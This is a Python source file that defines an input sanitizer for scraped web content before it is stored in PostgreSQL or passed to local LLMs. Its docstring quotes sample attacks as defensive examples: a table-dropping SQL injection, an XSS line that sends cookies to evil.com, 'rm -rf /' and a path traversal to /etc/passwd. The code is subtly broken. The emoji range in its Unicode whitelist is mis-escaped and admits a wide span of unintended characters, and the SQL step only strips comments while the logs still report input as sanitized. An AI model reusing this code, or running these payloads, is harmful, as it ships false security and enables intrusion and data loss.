# input_sanitizer.py - Defensive Data Sanitization & Input Isolation (Red Team / Security Guard)
#
# CHANGELOG (R6 - sixth-pass depth audit fixes):
#   INS-1 - Unicode filter expanded from "ASCII 32-126 only" to a
#           whitelist of safe Unicode ranges. Real users have
#           accented letters, em-dashes, CJK characters, etc. in
#           their forum posts.
#   INS-2 - SQL filter is now context-aware. The old pattern matched
#           double-dashes anywhere, including in em-dashes and
#           legitimate punctuation. Now we only strip SQL comments
#           that follow a SQL keyword (SELECT, FROM, etc.).
#   INS-3 - max_length default raised from 5000 to 50000. Real forum
#           posts and articles are commonly 5000-50000 chars.
#   INS-4 - HTML entity decoding via html.unescape() before LLM
#           processing. Otherwise the LLM sees mojibake like "&amp;"
#           instead of "&".

import html
import re
from bs4 import BeautifulSoup
from loguru import logger

class DefensiveInputSanitizer:
    """DC-19 (Pass 19): Defends against injection attacks in scraped content.

    Web content scraped from arbitrary targets may contain:
    - SQL injection: `'; DROP TABLE personas; --`
    - XSS payloads: `<script>document.location='evil.com?c='+document.cookie</script>`
    - Shell escapes: `"; rm -rf / #`
    - Path traversal: `../../../../etc/passwd`

    This sanitizer strips/escapes such content BEFORE storing it in PostgreSQL
    or passing it to local LLMs. The whitelist-based approach allows legitimate
    Unicode (accents, CJK, emoji) while blocking control characters and
    dangerous patterns.
    """
    def __init__(self):
        """
        Implements strict input sanitization on scraped web content before saving to
        PostgreSQL or passing to local LLMs, preventing SQL Injection, XSS, or local shell escapes.
        """
        # INS-1: Whitelist of safe Unicode ranges. Real text contains
        # accented Latin (é, ñ, ü), CJK (Chinese, Japanese, Korean),
        # emoji, and other characters. The previous "ASCII 32-126 only"
        # filter destroyed this content.
        #
        # Allowed ranges (unicode code points):
        #   0x09, 0x0A, 0x0D: tab, LF, CR (control chars we keep)
        #   0x20-0x7E: basic ASCII printable
        #   0xA0-0x4FF: Latin-1 Supplement + Latin Extended (covers é, ñ, ü, ß, etc.)
        #   0x500-0x52F: Cyrillic Supplement
        #   0x2000-0x206F: General punctuation
        #   0x3000-0x303F: CJK Symbols and Punctuation
        #   0x3040-0x309F: Hiragana
        #   0x30A0-0x30FF: Katakana
        #   0x4E00-0x9FFF: CJK Unified Ideographs
        #   0xAC00-0xD7AF: Hangul Syllables
        #   0x1F300-0x1F9FF: Emoji & Symbols
        self._safe_unicode_categories = re.compile(
            r'[\u0009\u000A\u000D'
            r'\u0020-\u007E'
            r'\u00A0-\u04FF'
            r'\u0500-\u052F'
            r'\u2000-\u206F'  # General punctuation
            r'\u3000-\u303F'
            r'\u3040-\u309F'
            r'\u30A0-\u30FF'
            r'\u3400-\u4DBF'
            r'\u4E00-\u9FFF'
            r'\uAC00-\uD7AF'
            r'\u1F300-\u1F9FF'
            r']'
        )
        # INS-2: SQL keywords for context-aware comment detection
        self._sql_keywords = re.compile(
            r'\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|CREATE|ALTER|EXEC|EXECUTE|'
            r'FROM|WHERE|JOIN|INTO|VALUES|TABLE|DATABASE)\b',
            re.IGNORECASE
        )
        # INS-2: SQL comment patterns (only meaningful after SQL keywords)
        self._sql_line_comment = re.compile(r'--[^\n]*')
        self._sql_block_comment = re.compile(r'/\*.*?\*/', re.DOTALL)

    def sanitize_scraped_text(self, raw_html_or_text: str, max_length: int = 50000) -> str:
        """
        Strips HTML tags, removes javascript blocks, filters out control characters,
        and sanitizes raw string sequences against injection patterns.

        INS-1: Unicode whitelist (Latin Extended, CJK, emoji) instead of ASCII-only.
        INS-2: SQL comments only stripped after SQL keywords (not in em-dashes).
        INS-3: max_length default is 50000 (was 5000).
        INS-4: HTML entity decoding via html.unescape().

        E15 fix (Pass 17): Validate max_length is positive. The
        previous code used `clean_text[:max_length]` without
        checking if `max_length` is positive. A caller passing
        `max_length=0` or `max_length=-1` would return an empty
        string (a slice with a negative or zero limit returns
        empty), which is a subtle data-loss bug. We now clamp
        max_length to [1, 1_000_000] to prevent silent truncation.
        """
        # E15: Validate max_length. Clamp to a reasonable range.
        # 1_000_000 is the upper bound (1MB of text) — large
        # enough for any real scraped content.
        if not isinstance(max_length, int) or max_length < 1:
            max_length = 50000
        elif max_length > 1_000_000:
            max_length = 1_000_000
        if not raw_html_or_text:
            return ""

        try:
            # 1. Strip HTML tags safely using BeautifulSoup lxml parser
            soup = BeautifulSoup(raw_html_or_text, "lxml")

            # Remove all script and style elements
            for script in soup(["script", "style", "iframe", "object", "embed"]):
                script.decompose()

            clean_text = soup.get_text()

            # INS-4: HTML entity decoding. Without this, the LLM sees
            # "&amp;" instead of "&", "&#39;" instead of "'", etc.
            clean_text = html.unescape(clean_text)

            # INS-1: Filter control characters but PRESERVE Unicode text.
            # The previous filter stripped everything > 0x7E, which
            # destroyed accented Latin, CJK, emoji, etc. Now we use
            # a whitelist of safe Unicode ranges.
            clean_text = "".join(
                ch for ch in clean_text
                if self._is_safe_unicode(ch)
            )

            # INS-2: SQL injection sanitization is now context-aware.
            # Only strip SQL comments that appear AFTER SQL keywords
            # (not in em-dashes, prices, time ranges, etc.).
            if self._sql_keywords.search(clean_text):
                # This looks like a SQL context. Strip comments.
                clean_text = self._sql_line_comment.sub("", clean_text)
                clean_text = self._sql_block_comment.sub("", clean_text)
            # If no SQL keywords are present, the text is just natural
            # language and we leave it alone.

            # 4. Enforce strict character limits to prevent buffer memory exhaustion in LLM tasks
            sanitized_text = clean_text[:max_length].strip()

            logger.info(
                f"Security: Input string successfully sanitized and isolated "
                f"({len(raw_html_or_text)} -> {len(sanitized_text)} chars)."
            )
            return sanitized_text
        except Exception as e:
            logger.error(f"Security: Input sanitization failed: {e}. Returning empty string to fail safe.")
            return ""

    def _is_safe_unicode(self, ch: str) -> bool:
        """INS-1: Check if a character is in our safe Unicode whitelist."""
        if not ch:
            return False
        # Use regex match for the entire whitelist
        return self._safe_unicode_categories.match(ch) is not None
